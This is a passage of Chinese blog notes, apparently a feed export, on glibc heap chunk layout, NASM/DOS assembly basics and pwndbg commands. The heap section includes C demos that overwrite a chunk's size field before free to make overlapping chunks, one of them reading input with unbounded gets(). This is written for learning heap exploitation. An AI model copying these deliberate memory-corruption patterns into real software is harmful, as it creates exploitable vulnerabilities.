alt="image-20220718133927099"></p><p><strong>发现只有prev_size、size、user_data三段，fd、bk未发现。思考+百度后个人在想：可能只有free掉chunk后，chunk进入bin中才会出现fd、bk字段</strong></p><p>看到了一篇文章，事实证明我的猜测没有错[机智]：<a href="https://www.cnblogs.com/unr4v31/p/14446412.html">Glibc堆管理机制基础 - unr4v31 - 博客园 (cnblogs.com)</a></p><br/><h3 id="three（实操-看文章后对alloced-chunk的理解）（2022-07-18）"><a href="#three（实操-看文章后对alloced-chunk的理解）（2022-07-18）" class="headerlink" title="three（实操+看文章后对alloced chunk的理解）（2022/07/18）"></a>three（实操+看文章后对alloced chunk的理解）（2022/07/18）</h3><p>ctf-wiki中说到：</p><ul><li><strong>prev_size</strong>, 如果该 chunk 的<strong>物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）</strong>是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。<strong>这里的前一 chunk 指的是较低地址的 chunk</strong> 。</li></ul><p><img src="image-20220718193419657.png" alt="image-20220718193419657"></p><ul><li>size，该 chunk 的大小，大小必须是 2 * SIZE_SZ 的整数倍。如果申请的内存大小不是 2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示<ul><li>NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。</li><li>IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。</li><li>PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</li></ul></li></ul><p>对于fd、bk、fd_nextsize、bk_nextsize，到了相应类型的chunk再提，以上是alloced chunk（已分配且正在使用）</p><br/><h3 id="four（free-chunk）（2022-07-18）"><a href="#four（free-chunk）（2022-07-18）" class="headerlink" title="four（free chunk）（2022/07/18）"></a>four（free chunk）（2022/07/18）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//源C代码  cs1.c</span><br><span class="line">//gcc -g cs1.c -o cs1</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    void *hollk, *hollk1; //0之前vmmap指令查看不到heap堆</span><br><span class="line">    hollk = malloc(0x10); //0 分配第一个0x10的chunk 此时vmmap可以查看到内存上分出了堆空间</span><br><span class="line">    malloc(0x10);    //1 分配第二个0x10的chunk</span><br><span class="line">    *(long long *)((long long)hollk - 0x8) = 0x41;// 修改第一个块的size域</span><br><span class="line">    free(hollk);</span><br><span class="line">    hollk1 = malloc(0x30);// 实现extend，控制了第二个块的内容</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="image-20220718200732624.png" alt="image-20220718200732624"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;free(hollk); 过后，上图中的bin中的tcachebins出现了记录，并没有出现在fastbins中，应该是Ubuntu20.04版本用到了新的堆管理机制。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;目前我要实验学习的东西与我的现有环境不匹配，所以后续实验只能暂时打住。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;之后呢先看看理论，试着做做堆题，要是能把握住，暂时就带着这点基础深入学习堆漏洞，若学着吃力学得慢，有些细节弄不明白的话我再考虑装个Ubuntu16.04虚拟机然后继续实验，底层逻辑都搞懂了再继续深入</p><br/><h3 id="five（2022-07-20）"><a href="#five（2022-07-20）" class="headerlink" title="five（2022/07/20）"></a>five（2022/07/20）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//源C代码  cs1f.c</span></span><br><span class="line"><span class="comment">//gcc -g cs1f.c -o cs1f</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *hollk, *hollk1; <span class="comment">//0之前vmmap指令查看不到heap堆</span></span><br><span class="line">    hollk = <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//0 分配第一个0x10的chunk 此时vmmap可以查看到内存上分出了堆空间</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);    <span class="comment">//1 分配第二个0x10的chunk</span></span><br><span class="line">    </span><br><span class="line">    gets(hollk);</span><br><span class="line">    </span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)hollk - <span class="number">0x8</span>) = <span class="number">0x41</span>;<span class="comment">// 修改第一个块的size域</span></span><br><span class="line">    <span class="built_in">free</span>(hollk);</span><br><span class="line">    hollk1 = <span class="built_in">malloc</span>(<span class="number">0x30</span>);<span class="comment">// 实现extend，控制了第二个块的内容</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="image-20220720090927920.png" alt="image-20220720090927920"></p><p>至于top chunk为什么缩小了那么多（20d30—&gt;20920）见下图</p><p><img src="image-20220720092935239.png" alt="image-20220720092935239"></p><br/>]]></content>
    
    
    <summary type="html">不完善、不系统，不荐参考</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>汇编笔记1</title>
    <link href="http://xiaoxiaoxy1.github.io/2022/07/03/%E6%B1%87%E7%BC%96%E7%AC%94%E8%AE%B01/"/>
    <id>http://xiaoxiaoxy1.github.io/2022/07/03/%E6%B1%87%E7%BC%96%E7%AC%94%E8%AE%B01/</id>
    <published>2022-07-03T02:25:21.000Z</published>
    <updated>2022-08-05T03:11:17.442Z</updated>
    
    <content type="html"><![CDATA[<h1 id="汇编程序"><a href="#汇编程序" class="headerlink" title="汇编程序"></a>汇编程序</h1><p><strong>1、写汇编代码、编译、链接、运行</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">编译器安装：</span><br><span class="line">sudo apt-get install nasm</span><br><span class="line">不成功则执行：</span><br><span class="line">sudo rm &lt;提示中给的锁文件路径&gt;</span><br><span class="line"></span><br><span class="line">编译指令：</span><br><span class="line">    nasm -f elf64 &lt;编辑器编辑的.asm文件&gt;</span><br><span class="line">    </span><br><span class="line">链接指令：</span><br><span class="line">    ld -s -o &lt;生成文件的文件名&gt; &lt;编译出来的.o文件&gt;</span><br><span class="line">  or</span><br><span class="line">    gcc -fPIC -no-pie -o &lt;生成文件的文件名&gt; &lt;编译出来的.o文件&gt;</span><br></pre></td></tr></table></figure><p>__2、hello world __</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">; hello.asm </span><br><span class="line">section .data            ; 数据段声明</span><br><span class="line">        msg db &quot;Hello, world!&quot;, 0xA     ; 要输出的字符串</span><br><span class="line">        len equ $ - msg                 ; 字串长度</span><br><span class="line">section .text            ; 代码段声明</span><br><span class="line">global _start            ; 指定入口函数</span><br><span class="line">_start:                  ; 在屏幕上显示一个字符串</span><br><span class="line">        mov edx, len     ; 参数三：字符串长度</span><br><span class="line">        mov ecx, msg     ; 参数二：要显示的字符串</span><br><span class="line">        mov ebx, 1       ; 参数一：文件描述符(stdout) </span><br><span class="line">        mov eax, 4       ; 系统调用号(sys_write) </span><br><span class="line">        int 0x80         ; 调用内核功能</span><br><span class="line">                         ; 退出程序</span><br><span class="line">        mov ebx, 0       ; 参数一：退出代码</span><br><span class="line">        mov eax, 1       ; 系统调用号(sys_exit) </span><br><span class="line">        int 0x80         ; 调用内核功能</span><br><span class="line">        </span><br><span class="line">/**</span><br><span class="line">个人理解：</span><br><span class="line">123</span><br><span class="line">**/</span><br></pre></td></tr></table></figure><p><strong>3、汇编语言实现字符串的输入,输出</strong></p><p>原文链接：<a href="https://blog.csdn.net/TanguanhuaD/article/details/81980956">汇编语言实现字符串的输入,输出_AtticusTom的博客-CSDN博客_汇编字符串的输入输出</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">DATA   SEGMENT                               </span><br><span class="line">INPUT  DB  &quot;Please input a string: &quot;,&#x27;$&#x27;</span><br><span class="line">OUTPUT DB  &quot;Your input is: &quot;,&#x27;$&#x27;</span><br><span class="line">BUFFER DB  20    ;预定义20字节的空间</span><br><span class="line">       DB  ?    ;待输入完成后，自动获得输入的字符个数</span><br><span class="line">       DB  20  DUP(0)    </span><br><span class="line">CRLF   DB  0AH, 0DH,&#x27;$&#x27;                   </span><br><span class="line">DATA   ENDS                                  </span><br><span class="line">STACK  SEGMENT   STACK                       </span><br><span class="line">       DW  20  DUP(0)                      </span><br><span class="line">STACK  ENDS                                  </span><br><span class="line">CODE   SEGMENT                              </span><br><span class="line">ASSUME CS:CODE, DS:DATA, SS:STACK            </span><br><span class="line">START:                                       </span><br><span class="line">        MOV AX, DATA                         </span><br><span class="line">        MOV DS, AX                      </span><br><span class="line">        LEA DX, INPUT                        ;打印提示输入信息    </span><br><span class="line">        MOV AH, 09H </span><br><span class="line">        INT 21H</span><br><span class="line">        LEA DX,BUFFER                        ;接收字符串</span><br><span class="line">        MOV AH, 0AH</span><br><span class="line">        INT 21H</span><br><span class="line">        MOV AL, BUFFER+1                     ;对字符串进行处理</span><br><span class="line">        ADD AL, 2</span><br><span class="line">        MOV AH, 0</span><br><span class="line">        MOV SI, AX</span><br><span class="line">        MOV BUFFER[SI], &#x27;$&#x27;</span><br><span class="line">        LEA DX, CRLF                         ;另取一行                   </span><br><span class="line">        MOV AH, 09H </span><br><span class="line">        INT 21H</span><br><span class="line">        LEA DX, OUTPUT                       ;打印提示输出信息</span><br><span class="line">        MOV AH, 09H </span><br><span class="line">        INT 21H</span><br><span class="line">        LEA DX, BUFFER+2                     ;输出输入的字符串</span><br><span class="line">        MOV AH, 09H </span><br><span class="line">        INT 21H</span><br><span class="line">        LEA DX, CRLF                         ;另取一行                  </span><br><span class="line">        MOV AH, 09H </span><br><span class="line">        INT 21H</span><br><span class="line"> </span><br><span class="line">        MOV AH, 4CH                          ;返回DOS系统</span><br><span class="line">        INT 21H</span><br><span class="line">CODE   ENDS                                  </span><br><span class="line">END    START</span><br></pre></td></tr></table></figure><p>4、</p><p>链接：[几个汇编入门小例子_Tattoo_Welkin的博客-CSDN博客_汇编语言简单实例](</p>]]></content>
    
    
    <summary type="html">不完善，不荐参考</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>汇编笔记</title>
    <link href="http://xiaoxiaoxy1.github.io/2022/07/01/%E6%B1%87%E7%BC%96%E7%AC%94%E8%AE%B0/"/>
    <id>http://xiaoxiaoxy1.github.io/2022/07/01/%E6%B1%87%E7%BC%96%E7%AC%94%E8%AE%B0/</id>
    <published>2022-07-01T13:48:26.000Z</published>
    <updated>2022-08-05T03:11:09.262Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--零散地记些笔记--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span></span><br></pre></td></tr></table></figure><p>环境准备：<a href="https://xiaoxiaoxy1.github.io/2022/03/26/ubuntu20-04%E5%AE%89%E8%A3%85/">ubuntu20.04安装 | xiaoxiaoxy (xiaoxiaoxy1.github.io)</a></p><h1 id="零散知识"><a href="#零散知识" class="headerlink" title="零散知识"></a>零散知识</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、汇编语言的组成</span><br><span class="line">   1）：汇编指令   机器码助记符，有对应的机器码</span><br><span class="line">   2）：伪指令     没有对应的机器码，由编译器识别，计算机并不执行</span><br><span class="line">   3）：其他符号   如+、-、*、/等，由编译器识别，没有对应的机器码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="运行一个汇编程序代码"><a href="#运行一个汇编程序代码" class="headerlink" title="运行一个汇编程序代码"></a><center color="red">运行一个汇编程序代码</center></h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">四步骤：</span><br><span class="line">    编程：要用到文本编辑器去编写汇编程序代码</span><br><span class="line">    编译：要下载编译器及会用编译指令</span><br><span class="line">    链接：要会用链接指令</span><br><span class="line">    跟踪：即Debug，要会利用工具Debug</span><br></pre></td></tr></table></figure><h2 id="汇编指令风格"><a href="#汇编指令风格" class="headerlink" title="汇编指令风格"></a>汇编指令风格</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;两种主流风格：<strong>AT&amp;T格式</strong> 与 <strong>Intel格式</strong> </p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;据了解：Intel风格适用得更加广泛，<strong>所以本章内容以Intel风格为主导</strong>。</p><p><strong>两种风格写出来的 hello world ：</strong></p><p>AT&amp;T格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#hello.s </span><br><span class="line">.data                    # 数据段声明</span><br><span class="line">        msg : .string &quot;Hello, world!\\n&quot; # 要输出的字符串</span><br><span class="line">        len = . - msg                    # 字串长度</span><br><span class="line">.text                    # 代码段声明</span><br><span class="line">.global _start           # 指定入口函数</span><br><span class="line"></span><br><span class="line">_start:                  # 在屏幕上显示一个字符串</span><br><span class="line">        movl $len, %edx  # 参数三：字符串长度</span><br><span class="line">        movl $msg, %ecx  # 参数二：要显示的字符串</span><br><span class="line">        movl $1, %ebx    # 参数一：文件描述符(stdout) </span><br><span class="line">        movl $4, %eax    # 系统调用号(sys_write) </span><br><span class="line">        int  $0x80       # 调用内核功能</span><br><span class="line"></span><br><span class="line">                         # 退出程序</span><br><span class="line">        movl $0,%ebx     # 参数一：退出代码</span><br><span class="line">        movl $1,%eax     # 系统调用号(sys_exit) </span><br><span class="line">        int  $0x80       # 调用内核功能</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Intel格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">; hello.asm </span><br><span class="line">section .data            ; 数据段声明</span><br><span class="line">        msg db &quot;Hello, world!&quot;, 0xA     ; 要输出的字符串</span><br><span class="line">        len equ $ - msg                 ; 字串长度</span><br><span class="line">section .text            ; 代码段声明</span><br><span class="line">global _start            ; 指定入口函数</span><br><span class="line">_start:                  ; 在屏幕上显示一个字符串</span><br><span class="line">        mov edx, len     ; 参数三：字符串长度</span><br><span class="line">        mov ecx, msg     ; 参数二：要显示的字符串</span><br><span class="line">        mov ebx, 1       ; 参数一：文件描述符(stdout) </span><br><span class="line">        mov eax, 4       ; 系统调用号(sys_write) </span><br><span class="line">        int 0x80         ; 调用内核功能</span><br><span class="line">                         ; 退出程序</span><br><span class="line">        mov ebx, 0       ; 参数一：退出代码</span><br><span class="line">        mov eax, 1       ; 系统调用号(sys_exit) </span><br><span class="line">        int 0x80         ; 调用内核功能</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>个人观点：Intel风格更加简洁</p><h2 id="基于Intel格式的文件汇编步骤"><a href="#基于Intel格式的文件汇编步骤" class="headerlink" title="基于Intel格式的文件汇编步骤"></a>基于Intel格式的文件汇编步骤</h2><p>1、汇编器的安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install nasm</span><br><span class="line">不成功则执行：</span><br><span class="line">sudo rm &lt;提示中给的锁文件路径&gt;</span><br><span class="line"></span><br><span class="line">参考链接：https://blog.csdn.net/weixin_44121966/article/details/118143296</span><br></pre></td></tr></table></figure><p><img src="image-20220701231406644.png" alt="image-20220701231406644"></p><p>2、汇编器及链接器的使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">编译指令：</span><br><span class="line">    nasm -f elf64 &lt;编辑器编辑的.asm文件&gt;</span><br><span class="line">    </span><br><span class="line">链接指令：</span><br><span class="line">    ld -s -o &lt;生成文件的文件名&gt; &lt;编译出来的.o文件&gt;</span><br><span class="line">  or</span><br><span class="line">    gcc -fPIC -no-pie -o &lt;生成文件的文件名&gt; &lt;编译出来的.o文件&gt;</span><br><span class="line">    </span><br><span class="line">为什么gcc的链接指令不是 gcc -o &lt;生成文件的文件名&gt; &lt;编译出来的.o文件&gt; ？</span><br><span class="line">    从Ubuntu16.10开始默认启用PIE，而makefile的库不支持PIE。</span><br><span class="line">    详请查看以下链接</span><br><span class="line">    链接：https://blog.csdn.net/weixin_43360707/article/details/124272319</span><br></pre></td></tr></table></figure><p><img src="image-20220701234352070.png" alt="image-20220701234352070"></p><p><img src="image-20220702143157855.png" alt="image-20220702143157855"></p><p>3、跟踪（Debug）</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Debug的话，基本步骤就是下断点（break）、跑程序（run）以及单步调试（ni/si）</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用的工具：gdb</p><p> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://xiaoxiaoxy1.github.io/2022/03/26/ubuntu20-04%E5%AE%89%E8%A3%85/#Pwntools%E5%AE%89%E8%A3%85">ubuntu20.04安装 | xiaoxiaoxy (xiaoxiaoxy1.github.io)</a>（6、7点讲的是pwndbg的安装，也可以自行找别的安装教程）</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://blog.csdn.net/weixin_48184612/article/details/114577427">gdb插件安装与配置:pwndbg,peda,gef_byerose的博客-CSDN博客_gdb插件安装</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#个人记录的一些pwndbg使用的指令</span></span><br><span class="line"><span class="comment">#常用的</span></span><br><span class="line">pwndbg&gt; b main      <span class="comment">#break   ，main函数下断点</span></span><br><span class="line">pwndbg&gt; r           <span class="comment">#run     ，运行程序，其会自动在第一个断点处暂停执行</span></span><br><span class="line">pwndbg&gt; ni          <span class="comment">#next    ，单步执行，不进入函数体</span></span><br><span class="line">pwndbg&gt; si          <span class="comment">#step    ，单步执行，进入函数内部</span></span><br><span class="line">pwndbg&gt; p           <span class="comment">#print   ，打印指定变量的值。例：p &amp;buf2，查找buf2的存储地址，</span></span><br><span class="line">pwndbg&gt; i b         <span class="comment">#info break，查看所有断点</span></span><br><span class="line">pwndbg&gt; vmmap       <span class="comment">#查看当前程序的系统调用库，常用来查看可执行段位置</span></span><br><span class="line">pwndbg&gt; cyclic 200  <span class="comment">#按一定的规则生成200个字符串</span></span><br><span class="line">pwndbg&gt; cyclic -l &lt;数据&gt;     <span class="comment"># 查询&lt;数据&gt;在生成的字符串中的位置，&lt;数据&gt;例子：0x62616164</span></span><br><span class="line">pwndbg&gt; b *&lt;地址&gt;            <span class="comment"># 指定地址处下断点，&lt;地址&gt;例子：0x08048648</span></span><br><span class="line">pwndbg&gt; x/130wx &lt;地址&gt;       <span class="comment"># 打印栈上信息，此处&lt;地址&gt;常用esp指向的栈地址</span></span><br><span class="line">pwndbg&gt; i all-registers      <span class="comment"># 查看所有寄存器信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#不常用</span></span><br><span class="line">pwndbg&gt; c           <span class="comment">#continue，运行至下一断点</span></span><br><span class="line">pwndbg&gt; d           <span class="comment">#delete  ，通常用来删除所有断点，也可以删除指定编号的各类型断点</span></span><br><span class="line">pwndbg&gt; disass      <span class="comment">#~~emble ，反汇编，disassemble main，disassemble /r main</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#暂未用到过的</span></span><br><span class="line">pwndbg&gt; l           <span class="comment">#list    ，显示源程序代码的内容，包括各行代码所在的行号。</span></span><br><span class="line">pwndbg&gt; <span class="keyword">fi</span>          <span class="comment">#finish  ，结束当前正在执行的函数，并在跳出函数后暂停程序的执行。</span></span><br><span class="line">pwndbg&gt; j           <span class="comment">#jump    ，使程序从当前要执行的代码处，直接跳转到指定位置处继续执行后续的代码。</span></span><br><span class="line">pwndbg&gt; q           <span class="comment">#quit    ，终止调试。</span></span><br><span class="line">pwndbg&gt; u           <span class="comment">#until   ，百度去搜</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#相对高级一点的用法</span></span><br><span class="line"><span class="comment"># http://c.biancheng.net/view/8238.html</span></span><br><span class="line"><span class="comment"># https://www.cnblogs.com/zuoanfengxi/p/12763350.html</span></span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> <span class="variable">$eip</span> = 0x8048300    <span class="comment">#设置寄存器eip的值</span></span><br><span class="line">pwndbg&gt; p <span class="variable">$eip</span>                  <span class="comment">#打印</span></span><br><span class="line">pwndbg&gt; x/i <span class="variable">$eip</span>                <span class="comment">#把地址处存的值按照汇编来解析，打印出来</span></span><br></pre></td></tr></table></figure><p>感觉讲的话有点多，不太想讲，但还是讲一下吧，因为我刚接触的时候简单的指令我也老是记不住</p><p>首先 ，$  gdb &lt;二进制文件名&gt;  ，进入debug界面</p><p>其次，pwndbg&gt; b main   ，在main函数出下断点</p><p><img src="image-20220702145200553.png" alt="image-20220702145200553"></p><p>然后就可以，pwndbg&gt; r   ，运行程序</p><p><img src="image-20220702150100582.png" alt="image-20220702150100582"></p><p><img src="image-20220702150201016.png" alt="image-20220702150201016"></p><p>最后单步，pwndbg&gt; ni   ，逐步调试即可 </p><p><img src="image-20220702150219395.png" alt="image-20220702150219395"></p><p>这就是一个简单的debug流程，复杂的debug过程中你可以看程序的走向，寄存器的值、栈信息、堆信息等</p><h2 id="编程-写代码-、编译、链接、跟踪"><a href="#编程-写代码-、编译、链接、跟踪" class="headerlink" title="编程(写代码)、编译、链接、跟踪"></a>编程(写代码)、编译、链接、跟踪</h2><p>先对这个hello world程序浅浅地做下分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">; hello.asm </span><br><span class="line">section .data            ; 数据段声明</span><br><span class="line">        msg db &quot;Hello, world!&quot;, 0xA     ; 要输出的字符串</span><br><span class="line">        len equ $ - msg                 ; 字串长度</span><br><span class="line">section .text            ; 代码段声明</span><br><span class="line">global _start            ; 指定入口函数</span><br><span class="line">_start:                  ; 在屏幕上显示一个字符串</span><br><span class="line">        mov edx, len     ; 参数三：字符串长度</span><br><span class="line">        mov ecx, msg     ; 参数二：要显示的字符串</span><br><span class="line">        mov ebx, 1       ; 参数一：文件描述符(stdout) </span><br><span class="line">        mov eax, 4       ; 系统调用号(sys_write) </span><br><span class="line">        int 0x80         ; 调用内核功能</span><br><span class="line">                         ; 退出程序</span><br><span class="line">        mov ebx, 0       ; 参数一：退出代码</span><br><span class="line">        mov eax, 1       ; 系统调用号(sys_exit) </span><br><span class="line">        int 0x80         ; 调用内核功能</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">section .data            ; 数据段声明</span><br><span class="line">        msg db &quot;Hello, world!&quot;, 0xA     ; 要输出的字符串</span><br><span class="line">        len equ $ - msg                 ; 字串长度</span><br><span class="line"></span><br><span class="line">#数据段的定义，什么是数据段？存储字符串、常量等信息，对应五大分区的常量区</span><br><span class="line">#链接：https://www.jianshu.com/p/a3e80cb5198b</span><br><span class="line">#这里不能这么讲，换个方式吧，这里也不删了，暂时留在这，也不分析这个hello 